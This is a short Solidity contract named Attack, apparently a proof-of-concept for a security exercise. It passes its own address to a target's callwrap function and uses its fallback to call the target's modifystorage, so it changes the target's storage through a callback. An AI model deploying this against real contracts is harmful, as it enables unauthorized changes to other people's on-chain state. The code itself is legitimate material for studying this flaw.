interface CallWrapperInterface {
    function callwrap(address called) external;
    function modifystorage(uint newdata) external;
}

contract Attack {
    CallWrapperInterface target;

    constructor(address _target) {
        target = CallWrapperInterface(_target);
    }

    function attack() public {
        target.callwrap(address(this));
    }

    fallback() external payable {
        target.modifystorage(1);
    }
}